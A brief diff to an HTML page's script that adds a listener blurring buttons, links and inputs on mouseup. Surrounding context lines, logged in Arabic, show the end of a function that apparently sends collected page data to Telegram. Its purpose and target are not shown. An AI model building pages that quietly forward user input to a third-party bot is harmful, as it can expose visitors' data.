@@ -293,6 +293,9 @@ button, a, input {
               .then(data => console.log("تم إرسال البيانات إلى تيليجرام", data))
               .catch(error => console.error("خطأ في الإرسال إلى تيليجرام", error));
         }
+        document.querySelectorAll('button, a, input').forEach(el => {
+  el.addEventListener('mouseup', () => el.blur());
+});
     </script>
 </body>
 </html>
